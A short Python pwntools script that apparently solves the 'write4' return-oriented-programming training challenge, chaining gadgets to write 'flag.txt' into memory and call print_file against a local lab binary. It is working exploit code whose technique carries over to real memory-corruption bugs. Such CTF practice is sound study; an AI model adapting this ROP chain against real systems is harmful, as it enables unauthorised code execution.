from pwn import *

r = process('./write4')

payload = b'a' * 40
pop_r14_r15 = p64(0x0000000000400690)
flag = p64(0x601030)
mov_ptr_r14_r15_ret = p64(0x0000000000400628)
string = b'flag.txt'
pop_rdi = p64(0x0000000000400693)
print_file = p64(0x400516) #print_file lay tu lenh got
payload += pop_r14_r15 + flag + string + mov_ptr_r14_r15_ret + pop_rdi + flag + print_file

r.sendline(payload)
r.interactive()
